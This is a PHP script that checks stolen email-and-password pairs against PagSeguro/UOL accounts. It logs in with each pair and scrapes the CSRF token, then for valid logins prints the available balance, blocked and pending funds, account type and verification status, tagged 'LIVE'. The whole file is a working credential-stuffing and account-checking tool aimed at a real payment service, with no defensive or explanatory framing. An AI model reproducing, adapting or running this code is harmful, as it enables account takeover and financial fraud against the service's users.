
<?php
set_time_limit(0);
error_reporting(0);
function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
$lista = $_GET['lista'];
$separador = explode("|", $lista);
$email = $separador[0];
$senha = $separador[1];


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://acesso.uol.com.br/login.html?skin=ps");
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_NOBODY, false);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIESESSION, false );
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies/pagseguro.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies/pagseguro.txt');
curl_setopt($ch, CURLOPT_REFERER, 'https://acesso.uol.com.br/login.html?skin=ps');
curl_setopt($ch, CURLOPT_VERBOSE, 1);
$d1 = curl_exec($ch);
$token = getStr($d1,'type="hidden" name="acsrfToken" value="','"');
curl_setopt($ch, CURLOPT_URL, "https://acesso.uol.com.br/login.html?skin=ps");
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_NOBODY, false);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIESESSION, false );
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies/pagseguro.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies/pagseguro.txt');
curl_setopt($ch, CURLOPT_REFERER, 'https://acesso.uol.com.br/login.html?skin=ps');
curl_setopt($ch, CURLOPT_VERBOSE, 1);
curl_setopt($ch, CURLOPT_POST, 1);                 
curl_setopt($ch, CURLOPT_POSTFIELDS, 'dest=REDIR%7Chttps%3A%2F%2Fpagseguro.uol.com.br%2F&deviceId=&skin=ps&user='.$email.'&pass='.$senha.'&entrar=');
$d2 = curl_exec($ch);
curl_close($ch);
if(stripos($d2, 'Comprar')){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://pagseguro.uol.com.br/account/wallet.jhtml");
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_NOBODY, false);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIESESSION, false );
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies/pagseguro.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies/pagseguro.txt');
curl_setopt($ch, CURLOPT_REFERER, 'https://pagseguro.uol.com.br/login.jhtml');
curl_setopt($ch, CURLOPT_VERBOSE, 1);
$d3 = curl_exec($ch);
$token = getStr($d3,'type="hidden" name="acsrfToken" value="','"');
curl_setopt($ch, CURLOPT_URL, "https://pagseguro.uol.com.br/login.jhtml");
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_NOBODY, false);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIESESSION, false );
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies/pagseguro.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies/pagseguro.txt');
curl_setopt($ch, CURLOPT_REFERER, 'https://pagseguro.uol.com.br/login.jhtml');
curl_setopt($ch, CURLOPT_VERBOSE, 1);
curl_setopt($ch, CURLOPT_POST, 1);                 
curl_setopt($ch, CURLOPT_POSTFIELDS, 'dest=+REDIR%7Chttps://pagseguro.uol.com.br/hub.jhtml&skin=&acsrfToken='.$token.'&user='.$email.'&pass='.$senha.'');
$d4 = curl_exec($ch);

	if(stripos($d4, '<div class="logged-user-info">')){
	
		if(strpos($d4, 'verificar conta')){
			$verificada = "Não";
		}else{
			$verificada = "Sim";
		}
		$tipo = getStr($d4,'href="/account/viewDetails.jhtml" title="','"');
		$disponivel = getStr($d4,'<dd id="accountBalance" class="positive">','</dd>');
		if ($disponivel == false) {
			$disponivel = "0,00";
		}
		$bloqueado = getStr($d4,'<dd id="accountBlocked" class="neutral">','</dd>');
		if ($bloqueado == false) {
			$bloqueado = "0,00";
		}
		$receber = getStr($d4,'<dd id="accountEscrow" class="neutral">','</dd>');
		if ($receber == false) {
			$receber = "0,00";
		}

		echo "LIVE → $lista | Disponivel: R$ $disponivel | Receber: $receber | Bloqueado: $bloqueado | Tipo: $tipo | Verificada: $verificada #FlashReverso"; 
	}else{
		echo "<font color='red' style='font-weight: bold;'>#REPROVADA </font> $lista";
	}
}
	if (file_exists(getcwd().'/cookies/pagseguro.txt')) {
        unlink(getcwd().'/cookies/pagseguro.txt');
    }

?>